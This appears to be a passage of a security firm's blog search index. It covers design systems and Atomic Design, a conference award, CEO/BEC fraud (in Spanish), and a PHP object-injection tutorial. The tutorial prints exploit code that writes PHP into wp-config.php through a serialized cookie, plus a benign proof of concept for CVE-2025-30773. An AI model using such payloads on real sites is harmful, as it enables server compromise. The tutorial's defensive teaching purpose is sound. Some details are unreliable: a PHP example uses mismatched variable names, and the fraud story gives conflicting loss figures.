like independent pieces rather than a company ecosystem.</p> <p>It turns out that, faced with this feedback, you're overcome with frustration. After all the effort invested, there are still problems with visual coherence. Determined to solve this challenge once and for all, you begin to research and come across a revelation: a term you had never heard of before, Design Systems.</p>"},{"location":"blog/posts/27-04-2025/#what-is-a-design-system","title":"What is a Design System?","text":"<p>When explaining what a Design System is, I like to make an analogy with LEGO. Just as these famous building blocks allow us to create unique and incredible structures, a Design System provides us with basic elements to build digital interfaces. These elements, called components, are like LEGO pieces: reusable (they can be used in multiple places) and modular (they function independently but integrate perfectly with others). And just as LEGO has themed series (Star Wars, Harry Potter, City) where all the pieces share a coherent aesthetic and combine perfectly with each other, a Design System ensures that all its elements \"belong to the same family\" visually.</p> <p></p> <p>Going more into technicalities and setting analogies aside, a Design System is a collection of reusable components, guided by clear principles, documented and standardized that allow teams to create designs in a coherent, consistent, and efficient manner. Additionally, it establishes a \"common language\" of design that greatly facilitates communication between design, development, and product teams.</p> <p>Now that we understand what a Design System is and its importance for maintaining visual consistency, the practical question arises: how do we implement it? Creating a complete system from scratch might seem overwhelming, especially if we don't have a clear structure to guide the process. Fortunately, there are proven methodologies that offer a defined path. Among them stands out an approach that, inspired by scientific principles, allows us to build complex systems from simple elements.</p>"},{"location":"blog/posts/27-04-2025/#atomic-design","title":"Atomic Design","text":"<p>The Atomic Design methodology, created by Brad Frost, is one of the most popular and effective ways to structure a Design System. This methodology takes inspiration from chemistry to organize interface components hierarchically, from the simplest to the most complex.</p> <p></p>"},{"location":"blog/posts/27-04-2025/#ions-design-tokens","title":"Ions (Design Tokens)","text":"<p>Ions are the most fundamental and abstract elements of the system. Just as in chemistry ions are charged particles that form part of atoms, in design they represent the basic properties and variables that will define the entire system:</p> <ul> <li>Colors (primary, secondary, and neutral palettes)</li> <li>Typography (families, sizes, weights)</li> <li>Spacing (grid system, margins, paddings)</li> <li>Shadows and elevations</li> <li>Borders and radii</li> <li>Opacities</li> <li>Transitions and animations</li> </ul>"},{"location":"blog/posts/27-04-2025/#some-examples","title":"Some examples","text":"<p>These elements, also known as \"Design Tokens,\" have no functionality by themselves, but they are crucial as they define the visual identity of the system and affect all other components. They are the fundamental properties that, as variables, can be modified to alter the entire appearance of the system without changing its structure.</p>"},{"location":"blog/posts/27-04-2025/#atoms","title":"Atoms","text":"<p>Atoms are the most basic and indivisible components of a Design System. Just as atoms in chemistry are the fundamental building blocks of matter, in design they represent the simplest elements of an interface:</p> <ul> <li>Buttons</li> <li>Text fields</li> <li>Icons</li> <li>Labels</li> <li>Checkboxes</li> <li>Simple selectors</li> <li>Avatars</li> </ul> <p>These elements can be implemented independently and have a specific function, but they cannot be broken down further without losing that function. A button, for example, applies ionic properties (colors, typography, spacing), but constitutes an indivisible functional unit.</p> <p></p>"},{"location":"blog/posts/27-04-2025/#molecules","title":"Molecules","text":"<p>Molecules are formed when two or more atoms join together to create components with specific functionalities. Some examples would be:</p> <ul> <li>A search field (combines a text field, a button, and an icon)</li> <li>A selection group (radio buttons with their labels)</li> <li>A simple card (combines title, description, and possibly an image)</li> </ul> <p>Molecules are relatively simple and focus on doing one thing well, but they already provide tangible functionality for the user.</p> <p></p>"},{"location":"blog/posts/27-04-2025/#organisms","title":"Organisms","text":"<p>Organisms are more complex components formed by combining molecules and/or atoms. They represent distinctive sections of an interface:</p> <ul> <li>A complete navigation bar (logo, menu, search, account buttons)</li> <li>A registration form (fields, validations, submission buttons)</li> <li>A product carousel (with product cards, navigation controls)</li> <li>A footer with multiple columns of information</li> </ul> <p>Organisms are components complex enough to constitute complete sections of an interface.</p> <p></p>"},{"location":"blog/posts/27-04-2025/#templates","title":"Templates","text":"<p>Templates are page layouts that show how organisms are organized in a coherent design. They don't contain real content but define the structure and layout:</p> <ul> <li>Home page template</li> <li>Product page template</li> <li>Contact form template</li> <li>Blog template</li> </ul> <p>Templates act as high-fidelity wireframes, showing the distribution of elements in each type of page.</p>"},{"location":"blog/posts/27-04-2025/#pages","title":"Pages","text":"<p>Pages are specific instances of templates that show how the interface would look with real content:</p> <ul> <li>The current home page with seasonal promotions</li> <li>A specific product page with its images and descriptions</li> <li>A specific blog article with its content</li> </ul> <p>Pages are the final manifestation of the entire system and allow testing how the Design System works in real scenarios.</p> <p></p>"},{"location":"blog/posts/27-04-2025/#why-use-atomic-design","title":"Why use Atomic Design?","text":"<ul> <li>Modularity: Allows creating, testing, and maintaining components independently.</li> <li>Scalability: Facilitates the addition of new components without breaking existing ones.</li> <li>Consistency: Ensures that the same components are used throughout the interface.</li> <li>Efficiency: Reduces duplication of work by reusing components.</li> <li>Collaboration: Provides a common language for designers and developers.</li> </ul> <p>If you want to delve deeper into this methodology, this book explains it perfectly and is one I based my understanding on (among others): Atomic Design</p> <p>The Atomic Design methodology provides us with a structured framework to organize the components of our Design System, from the simplest elements to complete pages. This systematic approach not only facilitates the creation and maintenance of coherent interfaces, but also reflects many of the inherent advantages of implementing a Design System. However, like any solution, adopting a Design System entails both significant benefits and certain challenges that we must consider. Understanding these implications will help us evaluate whether this investment is appropriate for our specific context and how we can maximize its value while mitigating its potential drawbacks.</p>"},{"location":"blog/posts/27-04-2025/#benefits-and-drawbacks-of-design-systems","title":"Benefits and Drawbacks of Design Systems","text":"<p>Implementing a Design System is a strategic decision that can profoundly transform the way an organization approaches digital design. Like any strategy, it's important to sit down and analyze the pros and cons of each possible solution before making a decision.</p>"},{"location":"blog/posts/27-04-2025/#benefits-of-implementing-a-design-system","title":"Benefits of implementing a Design System","text":""},{"location":"blog/posts/27-04-2025/#consistency-and-visual-coherence","title":"Consistency and visual coherence","text":"<p>Perhaps the most evident benefit and the main reason we started this conversation: a Design System ensures that all of a company's digital products maintain a coherent appearance and behavior. Users perceive a unified experience regardless of the product or service they are using, thus strengthening brand identity.</p>"},{"location":"blog/posts/27-04-2025/#development-efficiency","title":"Development efficiency","text":"<p>By having predefined and reusable components, development teams can implement new features or complete products in much less time. It's not necessary to \"reinvent the wheel\" every time a new interface is created, which significantly reduces delivery times.</p>"},{"location":"blog/posts/27-04-2025/#improved-collaboration-between-teams","title":"Improved collaboration between teams","text":"<p>A Design System establishes a common vocabulary between designers, developers, and stakeholders. This \"lingua franca\" facilitates communication, reduces misunderstandings, and streamlines review and approval processes, creating a more harmonious workflow.</p>"},{"location":"blog/posts/27-04-2025/#scalability","title":"Scalability","text":"<p>As a company grows and diversifies its digital products, a well-implemented Design System grows with it. Adding new functionalities or adapting existing ones becomes easier when starting from a solid and structured foundation.</p>"},{"location":"blog/posts/27-04-2025/#facilitates-testing-and-quality-control","title":"Facilitates testing and quality control","text":"<p>By using standardized components that have already been thoroughly tested, errors are reduced and the QA process is facilitated. Each component can be validated individually, ensuring it works correctly before integrating it into a broader context.</p>"},{"location":"blog/posts/27-04-2025/#improves-accessibility","title":"Improves accessibility","text":"<p>A good Design System incorporates accessibility considerations from its conception. This ensures that all products using it meet accessibility standards without requiring additional efforts from design or development teams.</p>"},{"location":"blog/posts/27-04-2025/#reduces-technical-and-design-debt","title":"Reduces technical and design debt","text":"<p>By establishing clear standards and maintaining updated documentation, the accumulation of \"patches\" or improvised solutions that often generate long-term problems is minimized.</p>"},{"location":"blog/posts/27-04-2025/#drawbacks-and-challenges","title":"Drawbacks and challenges","text":""},{"location":"blog/posts/27-04-2025/#significant-initial-investment","title":"Significant initial investment","text":"<p>Developing a complete Design System requires a considerable investment of time, resources, and effort. It's a medium to long-term project whose benefits are not always immediately visible, which can make it difficult to justify in environments where short-term results are prioritized.</p>"},{"location":"blog/posts/27-04-2025/#resistance-to-change","title":"Resistance to change","text":"<p>Implementing a Design System involves changes in established workflows. It's common to encounter resistance from teams accustomed to working with greater autonomy or with their own methodologies.</p>"},{"location":"blog/posts/27-04-2025/#continuous-maintenance","title":"Continuous maintenance","text":"<p>A Design System is not a project that is completed and archived; it requires constant maintenance, updates, and evolution. Without a firm commitment to its maintenance, it can quickly become obsolete or, worse, become an obstacle rather than a tool.</p>"},{"location":"blog/posts/27-04-2025/#can-limit-creativity","title":"Can limit creativity","text":"<p>Some designers may feel that working within the confines of a system limits their creative freedom. Finding the balance between standardization and flexibility is one of the greatest challenges in designing and managing these systems.</p>"},{"location":"blog/posts/27-04-2025/#complexity-in-implementation","title":"Complexity in implementation","text":"<p>For large organizations or those with extensive digital ecosystems, the transition to a Design System can be extremely complex, especially if it involves modifying existing products to adapt them to the new system.</p>"},{"location":"blog/posts/27-04-2025/#requires-organizational-commitment","title":"Requires organizational commitment","text":"<p>The success of a Design System depends on the commitment of the entire organization, from management to operational teams. Without this cross-cutting support, the project is unlikely to reach its full potential.</p>"},{"location":"blog/posts/27-04-2025/#learning-curve","title":"Learning curve","text":"<p>New team members will need time to familiarize themselves with the Design System, its structure, components, and rules. This can initially slow down the incorporation of new talent.</p> <p>After understanding the multiple benefits and challenges associated with Design Systems, a pragmatic question inevitably arises: when is it really advantageous to invest in their development? Not all business contexts or projects justify this investment of resources. Like any strategic tool, its implementation must respond to specific needs and align with organizational objectives. Let's analyze, therefore, the scenarios where a Design System can make a significant difference and those where perhaps more efficient alternatives exist.</p>"},{"location":"blog/posts/27-04-2025/#when-does-it-make-sense-to-implement-a-design-system","title":"When does it make sense to implement a Design System?","text":"<p>A Design System is especially valuable in the following scenarios:</p> <ul> <li>When the company manages multiple digital products that need to maintain visual and functional coherence.</li> <li>In large or distributed teams where communication and coordination pose a challenge.</li> <li>In long-term projects where efficiency in development and maintenance is crucial.</li> <li>When looking to rapidly scale digital production capacity without compromising quality.</li> </ul> <p>On the contrary, it might not be the best investment for:</p> <ul> <li>Startups in very early stages with limited resources and a single product.</li> <li>One-time or short-duration projects.</li> <li>Very small teams where communication and consistency are managed naturally.</li> </ul> <p>The decision to implement a Design System should be based on a careful analysis of specific needs, available resources, and long-term organizational objectives. As we've seen, it's not a universal solution, but when implemented in the right context, it can radically transform the efficiency and quality of digital design.</p> <p>Once we've evaluated the relevance of implementing a Design System and having decided to embark on this journey, the practical question inevitably arises: where do we start? So far, we've explored the conceptual foundations, from atomic structure to strategic considerations, but the path from theory to technical implementation requires a clear roadmap. Next, we'll outline the steps that will transform these concepts into tangible tools for our design and development teams.</p>"},{"location":"blog/posts/27-04-2025/#whats-next-from-concept-to-implementation","title":"What's Next: From Concept to Implementation","text":"<p>The true value of a Design System materializes when it goes from being a concept to becoming a set of practical tools that teams use daily. This technical implementation process involves several fundamental steps that connect theory with practice.</p>"},{"location":"blog/posts/27-04-2025/#definition-and-documentation-of-design-tokens","title":"Definition and Documentation of Design Tokens","text":"<p>The first step consists of transforming our \"ions\" into concrete and documented design tokens. This involves:</p> <ul> <li>Coding each color, typography, and spacing value into usable variables</li> <li>Establishing clear and coherent naming conventions</li> <li>Documenting the purpose and proper use of each token</li> <li>Creating versioning systems to manage their evolution</li> </ul>"},{"location":"blog/posts/27-04-2025/#development-of-the-component-library","title":"Development of the Component Library","text":"<p>With tokens defined, the next step is to develop a library of functional components that:</p> <ul> <li>Implements the atomic principles discussed earlier</li> <li>Translates visual designs into reusable code</li> <li>Incorporates tokens as variables that determine appearance</li> <li>Is accessible from different platforms and frameworks</li> </ul> <p>This process may involve creating components in different technologies according to team needs (React, Vue, Angular, etc.) and requires close collaboration between designers and developers.</p>"},{"location":"blog/posts/27-04-2025/#integration-and-adoption-strategies","title":"Integration and Adoption Strategies","text":"<p>Technical implementation must be complemented with strategies that facilitate the system's adoption by all teams involved. This includes:</p> <ul> <li>Creating testing environments and component visualization (storybooks)</li> <li>Developing technical implementation guides</li> <li>Establishing workflows for contribution and maintenance</li> <li>Training and accompanying teams during the transition</li> </ul> <p>In upcoming articles, we'll delve into each of these aspects, exploring specific tools, implementation methodologies, and practical cases that will illustrate the complete process of creating and integrating a Design System in different organizational contexts. From configuring token repositories to implementing components in code, through effective documentation strategies and change management, this journey is just beginning.</p>"},{"location":"blog/posts/27-04-2025/#references-and-recommended-reading","title":"References and Recommended Reading","text":"<p>This article has been nourished by the experience and knowledge shared by professionals and experts in the field. Below are some fundamental references for those who wish to delve deeper into the world of Design Systems:</p>"},{"location":"blog/posts/27-04-2025/#books","title":"Books","text":"<ul> <li>Frost, B. (2016). Atomic Design. https://atomicdesign.bradfrost.com/ This book, available for free online, establishes the foundations of the Atomic Design methodology that we've extensively explored in this article.</li> </ul>"},{"location":"blog/posts/27-04-2025/#articles-and-web-resources","title":"Articles and Web Resources","text":"<ul> <li> <p>Nielsen Norman Group. (2022). \"Design Systems 101\". https://www.nngroup.com/articles/design-systems-101/ A concise but comprehensive introduction to the concept of Design Systems by one of the most respected groups in UX.</p> </li> <li> <p>Toman, J. (2023). \"Beyond Atomic Design: Ions, Quarks and Design Tokens\". https://medium.com/designsystemsmastery/beyond-atomic-design-tokens-and-subatomic-particles Exploration of extensions to the traditional Atomic model, including the concept of ions that we've integrated into our approach.</p> </li> <li> <p>Clark, J. (2021). \"The Spectrum of Design Systems\". https://spectrum.adobe.com/page/design-systems/ An analysis of different approaches and levels of maturity in Design Systems.</p> </li> <li> <p>Jonatan Hernandez. \"LEGO, the best Design System mentor | Part 2 of 2\". https://jonatanhernandez.substack.com/p/lego-el-mejor-mentor-de-design-system-69b Another perspective on ions.</p> </li> </ul>"},{"location":"blog/posts/27-04-2025/#reference-design-systems","title":"Reference Design Systems","text":"<ul> <li> <p>Material Design (Google) One of the most complete and documented Design Systems, which has significantly influenced modern digital design.</p> </li> <li> <p>Carbon Design System (IBM) An excellent example of a Design System oriented to business products with integrated accessibility considerations.</p> </li> <li> <p>Polaris (Shopify) Notable for its exhaustive documentation and approach centered on clear design principles.</p> </li> <li> <p>Atlassian Design System An example of a Design System that balances consistency with flexibility for diverse products.</p> </li> </ul>"},{"location":"blog/posts/27-04-2025/#tools-and-platforms","title":"Tools and Platforms","text":"<ul> <li> <p>Storybook Development environment for creating, documenting, and testing user interface components in isolation.</p> </li> <li> <p>Figma Collaborative design tool that facilitates the creation and maintenance of component libraries.</p> </li> </ul>"},{"location":"blog/posts/30-03-2025/","title":"The PHP Serial Killer: Unsafe Deserialization","text":"<p>Some vulnerabilities go unnoticed until it's too late, and PHP Object Injection is definitely one of them. This often-overlooked vulnerability allows an attacker to inject manipulated PHP objects into an application, triggering a series of devastating consequences such as remote code execution, unauthorized file access, or privilege escalation.</p> <p>This type of attack is particularly dangerous because it's not always evident at first glance. It can lie dormant in the code for years until an attacker discovers how to exploit it. What appears to be a simple functionality for storing or transmitting data can turn into a backdoor that ends up compromising the integrity of the system.</p>","tags":["Cybersecurity","Pentesting","PHP Object Injection","Web Security","Vulnerabilities"]},{"location":"blog/posts/30-03-2025/#what-is-a-php-object-injection-vulnerability","title":"What is a PHP Object Injection vulnerability?","text":"<p>PHP Object Injection vulnerability occurs when an application deserializes attacker-controlled data without proper validation. To better understand it, imagine an application using serialization to store objects in cookies, databases, or user input parameters. If an attacker can manipulate this serialized data, they can inject malicious objects that, when deserialized, execute unintended code.</p> <p>A simple example:</p> <pre><code>&lt;?php\nclass User {\n    public $username;\n    public $isAdmin = false;\n}\n\n$username = new User();\n$user-&gt;username = \"JohnDoe\";\n\n$serialized = serialize($user);\necho $serialized;\n?&gt;\n</code></pre> <p>An attacker who can modify the input of this object could change the isAdmin property to true, gaining unauthorized access to restricted parts of the system. While this can already pose a danger, the real problem arises when the application deserializes objects from classes containing \"magic methods\" such as <code>__wakeup()</code> or <code>__destruct()</code>, often leading to arbitrary code execution.</p>","tags":["Cybersecurity","Pentesting","PHP Object Injection","Web Security","Vulnerabilities"]},{"location":"blog/posts/30-03-2025/#magic-methods","title":"Magic Methods","text":"<p>In PHP, magic methods are special functions within a class that are automatically executed under certain conditions. Some of the most relevant are:</p> <ul> <li><code>__wakeup()</code>: Executed when deserializing an object and typically used to initialize properties.</li> <li><code>__destruct()</code>: Called when an object is destroyed. If implemented insecurely, an attacker could manipulate code execution at the end of the object's lifecycle.</li> <li><code>__toString()</code>: Invoked when an object is treated as a string. If dynamic code is executed within this method, it could be exploited to run arbitrary commands.</li> </ul>","tags":["Cybersecurity","Pentesting","PHP Object Injection","Web Security","Vulnerabilities"]},{"location":"blog/posts/30-03-2025/#impact-of-a-php-object-injection-vulnerability","title":"Impact of a PHP Object Injection vulnerability","text":"<p>The impact of this vulnerability varies greatly depending on the context of the affected application. In some cases, the vulnerability can allow an attacker to escalate privileges, granting them greater control over the affected system. This could lead to manipulation of critical configurations, creation of backdoors for future access, or even disabling security measures implemented in the application.</p> <p>Another possible exploitation scenario is the combination of PHP Object Injection with other vulnerabilities present in the application or third-party libraries. This could potentially allow remote code execution (RCE), enabling the attacker to take full control of the server and compromise other related systems.</p>","tags":["Cybersecurity","Pentesting","PHP Object Injection","Web Security","Vulnerabilities"]},{"location":"blog/posts/30-03-2025/#example-of-php-object-injection-exploitation","title":"Example of PHP Object Injection exploitation","text":"<p>To illustrate a practical case of exploitation, let's consider an application that uses serialization to manage log files on a WordPress site.</p> <p>Vulnerable code:</p> <pre><code>&lt;?php\nclass Logger {\n    public $logFile = \"logs/app.log\";\n    public $message;\n\n    public function __destruct() {\n        file_put_contents($this-&gt;logFile, $this-&gt;message . \"\\n\", FILE_APPEND);\n    }\n}\n\n$cookie = $_COOKIE['session'] ?? '';\n$logEntry = unserialize(base64_decode($cookie));\n?&gt;\n</code></pre> <p>In this case, if an attacker can manipulate the session cookie, they could inject a malicious object to overwrite $logFile and add anything to the target file using the message parameter. The payload could be generated as follows:</p> <p>Exploitation:</p> <pre><code>&lt;?php\nclass Logger {\n    public $logFile = \"/var/www/htlm/wordpress/wp-config.php\";\n    public $message;\n\n    public function __destruct() {\n        file_put_contents($this-&gt;logFile, $this-&gt;message . \"\\n\", FILE_APPEND);\n    }\n}\n\n$payload = new Logger();\n$payload-&gt;message = \"&lt;?php phpinfo(); ?&gt;\";\n$session = base64_encode(serialize($payload));\necho \"session=$session\";\n?&gt;\n</code></pre> <p>If the attacker manages to get this cookie deserialized, the malicious input will be added to the file, appending arbitrary PHP code that will be executed when accessing the file.</p>","tags":["Cybersecurity","Pentesting","PHP Object Injection","Web Security","Vulnerabilities"]},{"location":"blog/posts/30-03-2025/#real-example-developing-a-poc-for-cve-2025-30773","title":"Real example, developing a PoC for CVE-2025-30773","text":"<p>In this example, we'll see a real case for a recently disclosed vulnerability, CVE-2025-30773.</p> Publication of CVE-2025-30773 <p>As we can see, it affects all versions up to 2.9.7, so we can look at what changed between 2.9.6 and 2.9.7 to find the entry point and reproduce the vulnerability. We'll go to the WordPress plugins svn. There we'll find the following change in a file where <code>unserialize</code> is replaced by <code>json_decode</code>:</p> Relevant Change <p>Reading the code, we see that the deserialized object comes from <code>trp_updb_extra_params</code>. We just need to see where we can manipulate this parameter, and we'll be able to make our functional Proof of Concept.</p> <p>After deploying the plugin in a testing instance and reviewing the code more thoroughly, we see that this parameter is passed when updating the database tables, i.e., when calling the <code>trp_update_database</code> action.</p> <p>To avoid giving a PoC of an RCE for a recently published vulnerability, in my case, I'm going to add a testing class to the code that simply prints that the object to be deserialized has been injected. Although it's quite trivial to get a proof of concept with a functional gadget.</p> <pre><code>&lt;?php\nclass ObjectInjection\n{\n   public $test;\n\n   function __destruct(){\n        die(\"PHP Object Injection triggered destruct: \" . $this-&gt;test);\n   }\n\n  function __wakeup(){\n        die(\"PHP Object Injection triggered wakeup: \" . $this-&gt;test);\n   }\n}\n?&gt;\n</code></pre> <p>With this, we can construct a payload to call this class as follows:</p> <pre><code>&lt;?php\nclass ObjectInjection\n{\n   public $test;\n\n   function __destruct(){\n        die(\"PHP Object Injection triggered destruct: \" . $this-&gt;test);\n   }\n\n  function __wakeup(){\n        die(\"PHP Object Injection triggered wakeup: \" . $this-&gt;test);\n   }\n}\n\n$a = new ObjectInjection();\n$b = base64_encode(serialize($a));\necho $b;\n?&gt;\n</code></pre> <p>And use it during the update by substituting the parameter with our payload:</p> Proof of Concept","tags":["Cybersecurity","Pentesting","PHP Object Injection","Web Security","Vulnerabilities"]},{"location":"blog/posts/30-03-2025/#how-to-prevent-php-object-injection-vulnerabilities","title":"How to prevent PHP Object Injection vulnerabilities","text":"<p>To mitigate the risk of PHP Object Injection, it's essential to follow good security practices in development:</p> <ul> <li> <p>Avoid using <code>unserialize()</code> with untrusted data: Always prefer secure data formats like JSON instead of PHP serialization.</p> </li> <li> <p>Implement an allowlist of permitted classes when deserializing objects: PHP 7.0 introduces <code>unserialize()</code> with allowed_classes to restrict which classes can be deserialized.</p> </li> <li> <p>Remove unnecessary classes with dangerous magic methods.</p> </li> <li> <p>Conduct regular security audits and penetration testing.</p> </li> </ul> <p>The PHP Object Injection vulnerability may seem like a minor technical issue, but in the right context, it becomes a dangerous tool for attackers. Applying appropriate preventive measures is key to keeping our applications secure and protected from potential exploitations.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","PHP Object Injection","Web Security","Vulnerabilities"]},{"location":"blog/posts/30-11-2024/","title":"XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT","text":"<p>Last Tuesday, we had the honor of attending the XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT, held at the Kin\u00e9polis cinemas in Ciudad de la Imagen, Madrid. The main purpose of this trip was to receive an award granted to our cybersecurity team, who emerged as winners of a national competition organized by the Universidad de Granada in collaboration with the El Mando Conjunto del Ciberespacio (MCCE) and the Instituto Nacional de Ciberseguridad (INCIBE). This recognition not only fills us with pride but also reinforces our commitment to new generations and our confidence in the immense talent of these young professionals.</p> <p>Moreover, we took advantage of our time at this important event to start carving out a space for ourselves in the industry, establishing connections with other companies, and learning from the experiences and advice of leading organizations in the technological landscape, both nationally and internationally.</p> <p>We are convinced that this is the right path, and we are leaving Madrid with great enthusiasm to help all the companies that place their trust in us achieve excellence.</p> <p>#XVIIIJORNADASCCNCERT #VIJORNADASESPDEFCERT</p> Our Team on the photocall <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","CCN-CERT","Awards"]},{"location":"es/blog/","title":"Bienvenido a nuestro Blog","text":""},{"location":"es/blog/posts/02-02-2025/","title":"La Costosa Lecci\u00f3n del Fraude del CEO: Por Qu\u00e9 es Crucial la Capacitaci\u00f3n en Ciberseguridad para Empleados","text":"<p>16 de Enero de 2016 \u2013 Ried im Innkreis, Austria. En las oficinas de FACC Operations GmbH (un fabricante austriaco de componentes aeroespaciales), un empleado del departamento de finanzas recibi\u00f3 un correo electr\u00f3nico urgente que parec\u00eda provenir directamente del CEO de la empresa.</p> <p>La solicitud era clara: se necesitaba una transferencia de un mill\u00f3n de euros para finalizar un \"proyecto estrat\u00e9gico\".</p> <p>Presionado por el car\u00e1cter \"confidencial\" de la solicitud y la autoridad del remitente, el empleado procedi\u00f3 con la transacci\u00f3n sin verificar su legitimidad.</p> <p>Unos d\u00edas m\u00e1s tarde, la FACC descubri\u00f3 que hab\u00eda sido estafada. El email no proced\u00eda del verdadero CEO, sino de cibercriminales que hab\u00edan suplantado su identidad. Como resultado, la compa\u00f1\u00eda perdi\u00f3 aproximadamente de 42 millones de euros en una sola transferencia bancaria.</p> <p>Esta caso muestra c\u00f3mo la falta de concienciaci\u00f3n y formaci\u00f3n en ciberseguridad puede provocar p\u00e9rdidas financieras masivas, no necesariamente debidas a fallos t\u00e9cnicos o vulnerabilidades software, sino m\u00e1s bien por el factor humano. </p>","tags":["Ciberseguridad","Fraude del CEO","BEC (Compromiso de Correo Electr\u00f3nico Empresarial)","Capacitaci\u00f3n de Empleados","Phishing","Ingenier\u00eda Social","Concienciaci\u00f3n sobre Ciberseguridad","Seguridad Corporativa"]},{"location":"es/blog/posts/02-02-2025/#por-que-invertir-recursos-en-la-formacion-de-los-empleados","title":"\u00bfPor qu\u00e9 invertir recursos en la formaci\u00f3n de los empleados?","text":"<ul> <li>El eslab\u00f3n m\u00e1s vulnerable</li> </ul> <p>Aunque disponga de medidas tecnol\u00f3gicas de \u00faltima generaci\u00f3n, si el personal no est\u00e1 atento, los empleados se convierten en el punto de entrada m\u00e1s f\u00e1cil para los atacantes.</p> <ul> <li>Ingenier\u00eda Social y Manipulaci\u00f3n</li> </ul> <p>Los ataques de  Phishing y BEC explotan la confianza y la autoridad en lugar de hackear las vulnerabilidades t\u00e9cnicas.</p> <ul> <li>Consecuencias Econ\u00f3micas y Reputational</li> </ul> <p>Una sola transacci\u00f3n fraudulenta puede causar p\u00e9rdidas multimillonarias y ** da\u00f1os irreparables** a la reputaci\u00f3n de la empresa.</p> <ul> <li>Falsa Sensaci\u00f3n de Seguridad</li> </ul> <p>Pensar, esto no nos va a pasar a nosotros, es un grave error. Los cibercriminales perfeccionan continuamente sus m\u00e9todos, dirigi\u00e9ndose a organizaciones de todos los tama\u00f1os.</p>","tags":["Ciberseguridad","Fraude del CEO","BEC (Compromiso de Correo Electr\u00f3nico Empresarial)","Capacitaci\u00f3n de Empleados","Phishing","Ingenier\u00eda Social","Concienciaci\u00f3n sobre Ciberseguridad","Seguridad Corporativa"]},{"location":"es/blog/posts/02-02-2025/#como-podemos-prevenir-estas-situaciones","title":"\u00bfC\u00f3mo Podemos Prevenir Estas Situaciones?","text":"<ul> <li>Entrenamiento Continuo</li> </ul> <p>Organice talleres, webinars y simulaciones de ataques de phishing o BEC. Ense\u00f1e a sus empleados a detectar emails sospechosos, direcciones de remitente alteradas y t\u00e1cticas exageradas de urgencia o confidencialidad.</p> <ul> <li>Pol\u00edticas de Verificaci\u00f3n Internas</li> </ul> <p>Establezca protocolos que exijan confirmaci\u00f3n telef\u00f3nica o en persona para transferencias de alto valor. Exigir doble aprobaci\u00f3n o firma de m\u00faltiples ejecutivos para las transacciones financieras importantes.</p> <ul> <li>Autenticaci\u00f3n Multifactor (MFA)</li> </ul> <p>Un nombre de usuario y contrase\u00f1a por s\u00ed solos no son suficientes. La verificaci\u00f3n en dos o varios pasos (c\u00f3digos de un solo uso, aplicaciones de autenticaci\u00f3n, tokes f\u00edsicos) dificultan el acceso no autorizado, especialmente cuando las credenciales son comprometidas mediante phishing.</p> <ul> <li>Cultura de la \"Desconfianza Constructiva\"</li> </ul> <p>Anime a los empleados a reportar y cuestionar la legitimidad de un email siempre que tengan dudas, sin miedo a las repercusiones. Crea un canal de comunicaci\u00f3n claro para reportar r\u00e1pidamente de las anomal\u00edas.</p>","tags":["Ciberseguridad","Fraude del CEO","BEC (Compromiso de Correo Electr\u00f3nico Empresarial)","Capacitaci\u00f3n de Empleados","Phishing","Ingenier\u00eda Social","Concienciaci\u00f3n sobre Ciberseguridad","Seguridad Corporativa"]},{"location":"es/blog/posts/02-02-2025/#conclusiones","title":"Conclusiones","text":"<p>El caso FACC demuestra que un \u00fanico fallo humano puede causar p\u00e9rdidas millonarias y graves da\u00f1os en la reputaci\u00f3n. No hubo malware, ni violaci\u00f3n de la red, s\u00f3lo un email bien elaborado que explot\u00f3 la confianza humana.</p> <p>La ciberseguridad no solo trata sobre firewalls y antivirus, sino tambi\u00e9n en crear una cultura que d\u00e9 prioridad a la seguridad mediante la formaci\u00f3n, concienciaci\u00f3n y protocolos estrictos. Cuando cada empleado entiende los riesgos y sabe como responder, el factor humano pasa de ser el eslab\u00f3n m\u00e1s d\u00e9bil a convertirse en la primera l\u00ednea de defensa.</p> <p>Los simulacros de phishing peri\u00f3dicos son esenciales para fortalecer la postura de ciberseguridad de la empresa. Los cibercriminales continuamente perfeccionan sus t\u00e1cticas, convirtiendo a los empleados en la primera l\u00ednea de defensa contra ataques como el Business Email Compromise (BEC) y robo de credenciales. Al realizar pruebas de phishing peri\u00f3dicas, las organizaciones pueden reforzar la concienciaci\u00f3n de la seguridad y formar al personal para reconocer y reportar emails sospechosos. Este enfoque proactivo reduce el error humano, minimiza los riesgos financieros y de reputaci\u00f3n, y fomenta una cultura de seguridad en la empresa.</p>","tags":["Ciberseguridad","Fraude del CEO","BEC (Compromiso de Correo Electr\u00f3nico Empresarial)","Capacitaci\u00f3n de Empleados","Phishing","Ingenier\u00eda Social","Concienciaci\u00f3n sobre Ciberseguridad","Seguridad Corporativa"]},{"location":"es/blog/posts/02-02-2025/#otros-casos","title":"Otros Casos","text":"","tags":["Ciberseguridad","Fraude del CEO","BEC (Compromiso de Correo Electr\u00f3nico Empresarial)","Capacitaci\u00f3n de Empleados","Phishing","Ingenier\u00eda Social","Concienciaci\u00f3n sobre Ciberseguridad","Seguridad Corporativa"]},{"location":"es/blog/posts/02-02-2025/#google-y-facebook","title":"Google y Facebook","text":"<p>Un estafador lituano envi\u00f3 emails fraudulentos durante varios a\u00f1os, haci\u00e9ndose pasar por un proveedor de hardware. Tanto Google como Facebook transfirieron fondos por un valor total de m\u00e1s de 100 millones de d\u00f3lares.</p> <p>Lee m\u00e1s en BBC  | Lee m\u00e1s en CNBC</p>","tags":["Ciberseguridad","Fraude del CEO","BEC (Compromiso de Correo Electr\u00f3nico Empresarial)","Capacitaci\u00f3n de Empleados","Phishing","Ingenier\u00eda Social","Concienciaci\u00f3n sobre Ciberseguridad","Seguridad Corporativa"]},{"location":"es/blog/posts/02-02-2025/#toyota-boshoku","title":"Toyota Boshoku","text":"<p>Una subsidiaria de Toyota transfiri\u00f3 aproximadamente 37 millones de d\u00f3lares a cibercriminales despu\u00e9s de recibir emails fraudulentos de apariencia genuina disfrazados de proveedor de comunicaciones.</p> <p>Lee m\u00e1s en Tripwire</p>","tags":["Ciberseguridad","Fraude del CEO","BEC (Compromiso de Correo Electr\u00f3nico Empresarial)","Capacitaci\u00f3n de Empleados","Phishing","Ingenier\u00eda Social","Concienciaci\u00f3n sobre Ciberseguridad","Seguridad Corporativa"]},{"location":"es/blog/posts/02-02-2025/#crelan-bank","title":"Crelan Bank","text":"<p>El Crelan Bank de B\u00e9lgica 